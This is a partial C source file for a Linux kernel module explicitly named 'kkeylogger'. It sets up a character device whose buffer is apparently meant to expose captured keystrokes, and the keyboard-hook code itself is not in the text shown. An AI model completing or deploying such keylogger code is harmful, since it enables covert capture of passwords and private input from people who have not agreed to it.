#include <linux/module.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/uaccess.h>
#include <linux/types.h>
#include <linux/keyboard.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/input.h>
#include "keys.h"

#define BUFF_SIZE (PAGE_SIZE << 2)

/* data to append to file */
static char msg[BUFF_SIZE];
static size_t buf_index = 0;
static int len = 0;

/* Variables for device and device class to create file inside /dev */
static dev_t dev_nr;
static struct class *my_class;
static struct cdev my_device;

#define DRIVER_NAME "kkeylogger"
#define DRIVER_CLASS "MyClass"

/**
 * @brief Read data out of the buffer
 */
static ssize_t driver_read(struct file *file, char __user *user_buffer, size_t size, loff_t *offset) {
	return simple_read_from_buffer(user_buffer, size, offset, msg, buf_index);
}

/**
 * @brief Write data to buffer
 */
static ssize_t driver_write(struct file *file, const char __user *user_buffer, size_t size, loff_t * offset) {
        int bytes_written = 0;
	if(size > len)
		return -EINVAL;
	memset(msg, 0, len);
	bytes_written = copy_from_user(msg, user_buffer, size);
	printk(KERN_ALERT "Message Recived from user: %s", msg);
	return size;
}


/**
 * @brief This function is called, when the device file is opened
 */
static int driver_open(struct inode *device_file, struct file *instance) {
        printk("dev_nr - open was called!\n");
        return 0;
}

/**
 * @brief This function is called, when the device file is opened
 */
static int driver_close(struct inode *device_file, struct file *instance) {
        printk("dev_nr - close was called!\n");
        return 0;
}

static struct file_operations fops = {
        .owner = THIS_MODULE,
        .open = driver_open,
        .release = driver_close,
        .read = driver_read,
	.write = driver_write
};
